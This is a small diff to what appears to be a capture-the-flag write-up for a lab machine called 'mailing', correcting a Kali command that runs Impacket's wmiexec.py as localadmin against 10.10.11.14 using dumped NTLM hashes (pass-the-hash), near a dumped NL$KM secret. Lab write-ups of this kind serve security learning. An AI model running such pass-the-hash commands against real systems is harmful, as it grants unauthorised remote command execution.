@@ -510,7 +510,7 @@ NL$KM:bb60ea5a21d6f66892c6bf06e2482968407bc70d3975d5b5e93f813545ea99f9fb4d9027ad
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/Desktop/mailing]
-└─# localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
+└─# python3 wmiexec.py localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
 ```
 
 <br />
